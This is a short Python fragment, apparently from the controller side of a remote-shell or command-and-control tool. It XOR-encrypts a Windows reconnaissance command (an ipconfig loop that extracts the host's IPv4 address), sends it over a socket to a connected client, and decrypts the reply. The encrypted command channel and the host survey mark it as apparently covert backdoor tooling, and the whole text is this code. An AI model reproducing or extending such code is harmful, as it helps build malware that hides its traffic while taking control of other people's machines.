                        send_data(client_socket, xor_encrypt_decrypt("for /f \"tokens=2 delims=:\" %i in ('ipconfig ^| findstr IPv4') do @echo %i".encode(), self.xor_encryption_key, self.use_urlsafe_base64_encoding).encode())
                        ark = xor_decrypt_base64(recv_data(client_socket).decode(), self.xor_encryption_key, self.use_urlsafe_base64_encoding)
